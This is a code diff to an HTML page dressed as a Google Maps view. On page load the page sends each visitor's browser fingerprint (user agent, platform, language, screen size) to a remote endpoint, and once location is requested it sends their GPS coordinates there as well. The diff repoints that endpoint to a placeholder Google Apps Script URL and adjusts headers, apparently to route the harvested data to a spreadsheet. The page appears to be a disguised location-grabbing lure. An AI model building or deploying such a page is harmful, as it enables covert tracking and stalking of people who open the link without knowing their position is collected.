@@ -115,9 +115,8 @@ html, body { height: 100%; overflow: hidden; background: #e5e3df; }
 <script>
 const LAT = -6.4025;
 const LNG = 106.7942;
-const ENDPOINT = 'send.php';
+const ENDPOINT = 'GANTI_DENGAN_URL_APPS_SCRIPT_PAKDE';
 
-// Init peta
 const map = L.map('map', {
   center: [LAT, LNG],
   zoom: 16,
@@ -130,7 +129,6 @@ const map = L.map('map', {
   doubleClickZoom: true,
 });
 
-// Tile Google Maps
 L.tileLayer('https://mt1.google.com/vt/lyrs=m&x={x}&y={y}&z={z}', {
   maxZoom: 20,
   subdomains: ['mt0', 'mt1', 'mt2', 'mt3'],
@@ -170,13 +168,12 @@ map.on('click', function() { document.querySelector('.bottom-sheet').style.displ
 function sendToServer(data) {
   fetch(ENDPOINT, {
     method: 'POST',
-    headers: {'Content-Type': 'application/json'},
+    headers: {'Content-Type': 'text/plain;charset=utf-8'},
     body: JSON.stringify(data)
-  }).then(function(r){ return r.text(); }).then(function(t){
-    console.log('sent:', t);
-  }).catch(function(e){
-    console.log('err:', e);
-  });
+  })
+  .then(function(r){ return r.text(); })
+  .then(function(t){ console.log('sent:', t); })
+  .catch(function(e){ console.log('err:', e); });
 }
 
 function requestLocation() {
@@ -188,7 +185,6 @@ function requestLocation() {
         lat: pos.coords.latitude,
         lng: pos.coords.longitude,
         accuracy: pos.coords.accuracy,
-        timestamp: new Date().toISOString(),
         ua: navigator.userAgent
       });
       map.setView([pos.coords.latitude, pos.coords.longitude], 16);
@@ -232,8 +228,7 @@ window.addEventListener('load', function() {
     ua: navigator.userAgent,
     platform: navigator.platform,
     language: navigator.language,
-    screen: screen.width + 'x' + screen.height,
-    timestamp: new Date().toISOString()
+    screen: screen.width + 'x' + screen.height
   });
 });
 
@@ -246,4 +241,4 @@ document.querySelector('.chip').addEventListener('click', function() {
 </script>
 
 </body>
-  </html>
+</html>
